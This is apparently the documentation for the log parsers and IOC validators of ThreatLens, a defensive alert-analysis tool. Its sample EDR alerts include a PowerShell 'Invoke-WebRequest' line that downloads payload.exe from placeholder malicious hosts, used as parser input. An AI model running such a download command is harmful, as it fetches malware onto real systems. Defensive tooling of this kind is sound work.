# Utilities Documentation

This document describes the utility modules included in ThreatLens: **Parsers** and **Validators**.

---

## 📋 Table of Contents

1. [Log Parsers](#log-parsers)
2. [Input Validators](#input-validators)
3. [Usage Examples](#usage-examples)

---

## 🔍 Log Parsers

The `parsers.py` module provides intelligent parsing for various security log formats.

### Supported Log Formats

#### 1. **Syslog Format**
Standard Unix/Linux system logs

**Example:**
```
Jan 29 14:23:45 firewall sshd[1234]: Failed password for root from 192.168.1.1
```

**Parsed Fields:**
- `timestamp`: "Jan 29 14:23:45"
- `hostname`: "firewall"
- `process`: "sshd"
- `pid`: "1234"
- `message`: "Failed password for root from 192.168.1.1"

#### 2. **Firewall Logs**
Supports multiple firewall formats (Cisco ASA, generic)

**Examples:**
```
DENY TCP 45.141.84.223:12345 -> 10.0.0.50:443
blocked connection from 192.168.1.100 to 10.0.0.50:443
%ASA-4-106023: Deny tcp src inside:192.168.1.1/1234 dst outside:8.8.8.8/80
```

**Parsed Fields:**
- `action`: DENY, DROP, BLOCK, etc.
- `protocol`: TCP, UDP, ICMP
- `src_ip`: Source IP address
- `dst_ip`: Destination IP address
- `src_port`: Source port (if available)
- `dst_port`: Destination port (if available)

#### 3. **Windows Event Logs**
Windows security and system events

**Example:**
```
Event ID: 4625
Source: Microsoft-Windows-Security-Auditing
Level: Warning
A logon attempt failed
```

**Parsed Fields:**
- `event_id`: Event ID number
- `source`: Event source
- `level`: Information, Warning, Error, Critical

#### 4. **IDS/IPS Alerts**
Snort and Suricata alert formats

**Example:**
```
[1:2012648:1] ET POLICY Suspicious outbound connection [Classification: Potentially Bad Traffic] [Priority: 2]
```

**Parsed Fields:**
- `signature_id`: Signature ID
- `generator_id`: Generator ID
- `revision`: Revision number
- `message`: Alert message
- `classification`: Alert classification
- `priority`: Priority level

#### 5. **EDR (Endpoint Detection) Alerts**
Endpoint security alerts with process information

**Example:**
```
Process: powershell.exe
Command Line: Invoke-WebRequest http://malicious.com/payload.exe
User: DOMAIN\john.doe
Parent Process: explorer.exe
```

**Parsed Fields:**
- `process`: Process name
- `command_line`: Full command executed
- `user`: User account
- `parent_process`: Parent process name

### Universal Parser

The `UniversalLogParser` automatically detects and parses any supported format:

```python
from utils.parsers import UniversalLogParser

parser = UniversalLogParser()

# Parse single log
log = "Jan 29 14:23:45 firewall blocked connection from 10.0.0.1"
result = parser.parse(log)
print(result['format'])  # 'firewall' or 'syslog'

# Parse multiple logs
logs = [
    "DENY TCP 1.1.1.1:80 -> 10.0.0.1:443",
    "Event ID: 4625 - Failed logon",
    "Jan 29 10:00:00 server kernel: Firewall DROP"
]
results = parser.parse_multiple(logs)
```

---

## ✅ Input Validators

The `validators.py` module provides comprehensive validation for user inputs and IOCs.

### 1. Alert Text Validation

**InputValidator** ensures alert text is safe and valid:

```python
from utils.validators import InputValidator

validator = InputValidator()

# Validate alert
is_valid, error = validator.validate_alert_text(alert_text)
if not is_valid:
    print(f"Error: {error}")

# Sanitize text
clean_text = validator.sanitize_text(alert_text)
```

**Checks:**
- Not empty
- Length limits (max 50,000 characters)
- Minimum length (10 characters)
- Removes null bytes and control characters
- Basic XSS/SQL injection detection

### 2. IOC Validation

**IOCValidator** validates all types of indicators:

#### IP Address Validation
```python
from utils.validators import IOCValidator

validator = IOCValidator()

is_valid, error = validator.validate_ip("192.168.1.1")
# Returns: (True, None)

is_valid, error = validator.validate_ip("256.1.1.1")
# Returns: (False, "Invalid IP address...")
```

**Checks:**
- Valid IPv4 format
- Not multicast or reserved
- Proper range (0-255 for each octet)

#### Domain Validation
```python
is_valid, error = validator.validate_domain("example.com")
# Returns: (True, None)

is_valid, error = validator.validate_domain("invalid..com")
# Returns: (False, "Invalid domain format")
```

**Checks:**
- Valid domain format
- Maximum length (253 characters)
- Proper TLD structure
- Flags suspicious TLDs (.tk, .ml, etc.)

#### URL Validation
```python
is_valid, error = validator.validate_url("https://example.com/path")
# Returns: (True, None)
```

**Checks:**
- Valid URL structure
- Has scheme (http/https/ftp)
- Has domain
- Maximum length (2048 characters)

#### File Hash Validation
```python
is_valid, error, hash_type = validator.validate_hash("44d88612fea8a8f36de82e1278abb02f")
# Returns: (True, None, 'md5')
```

**Supports:**
- MD5 (32 hex characters)
- SHA1 (40 hex characters)
- SHA256 (64 hex characters)

#### Email Validation
```python
is_valid, error = validator.validate_email("user@example.com")
# Returns: (True, None)
```

#### CVE Validation
```python
is_valid, error = validator.validate_cve("CVE-2024-1234")
# Returns: (True, None)
```

**Format:** CVE-YYYY-NNNN (where YYYY is year, NNNN is 4+ digit number)

### 3. Batch IOC Validation

Validate multiple IOCs at once:

```python
iocs = {
    'ipv4': ['192.168.1.1', '8.8.8.8', '256.1.1.1'],
    'domains': ['example.com', 'invalid..com'],
    'hashes': {
        'md5': ['44d88612fea8a8f36de82e1278abb02f'],
        'sha1': [],
        'sha256': []
    },
    'cves': ['CVE-2024-1234']
}

results = validator.validate_iocs(iocs)

# Access results
print(f"Valid IPs: {results['valid']['ips']}")
print(f"Invalid IPs: {results['invalid']['ips']}")
```

### 4. API Response Validation

**APIResponseValidator** validates responses from threat intelligence APIs:

```python
from utils.validators import APIResponseValidator

# Validate VirusTotal response
is_valid = APIResponseValidator.validate_virustotal_response(response)

# Validate AbuseIPDB response
is_valid = APIResponseValidator.validate_abuseipdb_response(response)

# Validate Gemini response
is_valid = APIResponseValidator.validate_gemini_response(response)
```

### 5. Security Validation

**SecurityValidator** provides additional security checks:

```python
from utils.validators import SecurityValidator

# Check for DoS attacks
is_safe, warning = SecurityValidator.is_safe_for_processing(text)
if not is_safe:
    print(f"Security warning: {warning}")

# Rate limiting (placeholder for production)
within_limit = SecurityValidator.check_rate_limit(user_id)
```

**Checks:**
- Input size limits (DoS protection)
- Excessive repetition detection
- Null byte detection

---

## 🎯 Usage Examples

### Example 1: Parse and Validate a Security Alert

```python
from utils.parsers import UniversalLogParser
from utils.validators import InputValidator, IOCValidator

# Sample alert
alert = """
Jan 29 14:23:45 firewall blocked connection from 10.0.0.15 to 185.220.101.50:443
User: john.doe
Process: powershell.exe
Command: Invoke-WebRequest http://malicious-domain.com/payload.exe
File hash: 44d88612fea8a8f36de82e1278abb02f
CVE-2024-1234 exploitation detected
"""

# Step 1: Validate the alert
input_validator = InputValidator()
is_valid, error = input_validator.validate_alert_text(alert)
if not is_valid:
    print(f"Invalid alert: {error}")
    exit()

# Step 2: Parse the alert
parser = UniversalLogParser()
parsed = parser.parse(alert)
print(f"Detected format: {parsed['format']}")

# Step 3: Validate individual IOCs
ioc_validator = IOCValidator()

# Validate IP
is_valid, error = ioc_validator.validate_ip("185.220.101.50")
print(f"IP valid: {is_valid}")

# Validate domain
is_valid, error = ioc_validator.validate_domain("malicious-domain.com")
print(f"Domain valid: {is_valid}")

# Validate hash
is_valid, error, hash_type = ioc_validator.validate_hash("44d88612fea8a8f36de82e1278abb02f")
print(f"Hash valid ({hash_type}): {is_valid}")

# Validate CVE
is_valid, error = ioc_validator.validate_cve("CVE-2024-1234")
print(f"CVE valid: {is_valid}")
```

### Example 2: Batch Processing Logs

```python
from utils.parsers import UniversalLogParser

parser = UniversalLogParser()

# Multiple logs from different sources
logs = [
    "Jan 29 10:00:00 server1 kernel: Firewall: DROP IN=eth0 OUT=",
    "DENY TCP 45.141.84.223:12345 -> 10.0.0.50:443",
    "Event ID: 4625 - Logon failure",
    "[1:2012648:1] ET POLICY Suspicious outbound connection"
]

# Parse all logs
results = parser.parse_multiple(logs)

# Process results
for i, result in enumerate(results, 1):
    print(f"Log {i}: Format={result['format']}")
    if result['format'] == 'firewall':
        print(f"  Action: {result['action']}")
        print(f"  Source: {result['src_ip']}")
```

### Example 3: Complete Validation Pipeline

```python
from utils.validators import validate_alert, validate_ioc_list

# Quick validation
alert_text = "Security alert: suspicious activity from 192.168.1.1"
is_valid, error = validate_alert(alert_text)

# Validate extracted IOCs
iocs = {
    'ipv4': ['192.168.1.1', '8.8.8.8'],
    'domains': ['example.com'],
    'hashes': {'md5': ['44d88612fea8a8f36de82e1278abb02f']},
    'cves': ['CVE-2024-1234']
}

validation_results = validate_ioc_list(iocs)

print(f"Valid IPs: {len(validation_results['valid']['ips'])}")
print(f"Valid domains: {len(validation_results['valid']['domains'])}")
print(f"Invalid items: {validation_results['invalid']}")
```

---

## 🚀 Running Examples

Test the utilities with the provided examples:

```bash
cd backend
python3 examples_usage.py
```

This will demonstrate:
- Parsing various log formats
- Validating different IOC types
- Integrated parsing and validation workflow

---

## 📝 Notes

### When to Use

**Parsers:**
- Use when you need to extract structured data from logs
- Useful for integrating with SIEM systems
- Helps normalize different log formats

**Validators:**
- Use before processing any user input
- Essential for security and data integrity
- Prevents injection attacks and malformed data

### Integration with ThreatLens

These utilities are automatically used by ThreatLens:
- **IOC Extractor** uses regex patterns (could be enhanced with parsers)
- **Flask API** validates all inputs before processing
- **Report Generator** ensures all IOCs are valid before including in reports

### Future Enhancements

Potential additions:
- [ ] JSON log format support
- [ ] Custom log format definitions
- [ ] Machine learning-based log classification
- [ ] More sophisticated input sanitization
- [ ] IPv6 support
- [ ] URL defanging/refanging utilities

---

## 💡 Best Practices

1. **Always validate before processing**: Use validators on all user inputs
2. **Parse structured data**: Use parsers to extract useful information
3. **Handle validation errors gracefully**: Display helpful error messages
4. **Log validation failures**: Track patterns in failed validations
5. **Keep validators updated**: Add new IOC types as threats evolve

---

**For more information, see:**
- `backend/utils/parsers.py` - Full parser implementation
- `backend/utils/validators.py` - Full validator implementation
- `backend/examples_usage.py` - Working examples
